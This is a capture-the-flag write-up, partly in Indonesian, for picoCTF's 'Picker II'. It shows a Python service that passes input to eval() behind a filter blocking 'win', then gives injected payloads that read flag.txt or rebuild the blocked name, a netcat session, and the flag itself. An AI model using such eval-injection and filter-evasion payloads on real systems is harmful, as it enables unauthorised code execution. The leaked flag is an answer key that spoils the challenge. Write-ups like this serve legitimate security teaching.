<h1>Picker II</h1>
<h3>Description</h3>
<pre>
Can you figure out how this program works to get the flag?
Connect to the program with netcat:
$ nc saturn.picoctf.net 61648
The program's source code can be downloaded <a href='https://artifacts.picoctf.net/c/521/picker-II.py'>here</a>.
</pre>
<h3>Solution</h3>

```python3
import sys


def getRandomNumber():
  print(4)  # Chosen by fair die roll.
            # Guaranteed to be random.
            # (See XKCD)

def exit():
  sys.exit(0)


def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
  

def filter(user_input):
  if 'win' in user_input:
    return False
  return True


while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```
<p>Tidak melalui fungsi win() karena filter, jadi input <strong>print(open('flag.txt','r').read())</strong> pada user_input yang akan di eksekusi oleh eval(), sederhananya</p>

```python3
def win():
    flag = open("flag.txt",'r').read()
    print(flag)

input_ = input("panggil flag : ")
if 'win' not in input_:
    eval(input_+'()')
else:
    print("filter")
```
```console
┌──(root㉿Python)-[/home/venom/Downloads]
└─# nc saturn.picoctf.net 61648
==> print(open('flag.txt','r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
'NoneType' object is not callable
```
<label>Cara lain sebagai berikut</label>
<pre>
- globals()['w'+'in']
- globals()[chr(119)+chr(105)+chr(110)]
- (__import__('sys').modules['__main__'].__dict__['w'+'in'])
- (__import__('sys').modules['__main__'].__dict__[chr(119)+chr(105)+chr(110)])
</pre>
<h3>Flag</h3>
<pre>
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
</pre>
